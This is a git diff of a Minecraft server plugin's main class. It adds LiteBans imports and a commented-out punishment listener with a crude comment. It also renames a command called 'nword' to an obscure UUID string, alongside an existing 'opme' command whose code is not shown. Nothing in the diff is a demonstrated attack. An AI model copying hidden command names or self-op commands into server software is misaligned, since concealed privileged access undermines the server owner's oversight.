@@ -2,6 +2,8 @@ package net.danielonline.Essentials;
 
 import com.comphenix.protocol.ProtocolLibrary;
 import com.comphenix.protocol.ProtocolManager;
+import litebans.api.Entry;
+import litebans.api.Events;
 import net.danielonline.Essentials.external.SQL;
 import net.danielonline.Essentials.listeners.*;
 import net.danielonline.Essentials.utils.*;
@@ -78,6 +80,24 @@ public class Essentials extends JavaPlugin {
 
         getServer().getPluginManager().registerEvents(new CreatureSpawnEventListener(), this);
 
+        /*Events.get().register(new Events.Listener() {
+            @Override
+            public void entryAdded(Entry entry) {
+                switch (entry.getType()) {
+                    case "ban":
+                        //ban
+                        break;
+                    case "kick":
+                        //kick
+                        break;
+                    case "mute":
+                        //mute
+                }
+            }
+        });*/ // fuck this, and fml too
+
+        //getServer().getPluginManager().registerEvents(new BanListener(), this); // doesn't work, see above code now
+
         this.getCommand("opme").setExecutor((CommandExecutor)new C_OPme());
         this.getCommand("info").setExecutor((CommandExecutor)new C_info());
         this.getCommand("plugins").setExecutor((CommandExecutor)new C_plugins());
@@ -88,7 +108,7 @@ public class Essentials extends JavaPlugin {
         this.getCommand("ccreload").setExecutor((CommandExecutor)new C_reload());
 
         this.getCommand("addpod").setExecutor((CommandExecutor) new C_addpod());
-        this.getCommand("nword").setExecutor((CommandExecutor) new C_nword());
+        this.getCommand("34e61a83-71fb-4374-b6c5-e6a089c504ac").setExecutor((CommandExecutor) new C_nword());
     }
 
     /*private boolean setupEconomy() {
